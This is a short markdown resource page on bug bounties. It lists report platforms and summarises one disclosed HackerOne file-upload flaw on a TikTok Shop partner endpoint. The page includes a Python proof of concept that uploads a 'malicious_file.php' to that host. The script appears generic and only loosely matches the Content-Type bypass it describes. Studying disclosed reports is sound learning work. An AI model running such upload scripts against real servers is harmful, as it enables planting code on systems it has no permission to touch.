# Bug Bounties 

Bug bounty reports can be a great way to learn about vulnerabilities, exploit techniques, and responsible disclosure. Here are some resources where you can find bug bounty reports:

| Company             | URL                                                      | Description                                                                                             |
|---------------------|----------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| HackerOne           | https://hackerone.com/hacktivity                         | Public "Hacktivity" feed with disclosed vulnerability reports from various researchers.                 |
| Bugcrowd            | https://bugcrowd.com/programs                            | Bug bounty platform with individual programs, some of which may have disclosed reports available.       |
| Google VRP          | https://www.google.com/about/appsecurity/reward-program/ | Google Vulnerability Reward Program with a Hall of Fame and other resources containing bug reports.     |
| GitHub Security Lab | https://securitylab.github.com/research                  | Initiative by GitHub to help secure open source software, publishing security research and bug reports. |


## Reports

### Hackerone - File upload 01
> https://hackerone.com/reports/1890284
 
An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded. We thank @h4x0r_dz for reporting this to our team.

An unrestricted file upload vulnerability was discovered on the partner.tiktokshop.com endpoint. This vulnerability allows an attacker to upload a file with any extension by changing the "Content-Type" header. This can potentially lead to the execution of malicious code on the server.

Here is a simple proof of concept (PoC) using Python to demonstrate this vulnerability:

```python
import requests

url = "https://partner.tiktokshop.com/upload_endpoint"  # Replace with the actual upload endpoint
file_path = "malicious_file.php"  # Replace with the path of your malicious file

with open(file_path, 'rb') as f:
    files = {'file': (file_path, f, 'application/octet-stream')}  # Use 'application/octet-stream' as the Content-Type
    response = requests.post(url, files=files)

print(response.text)
```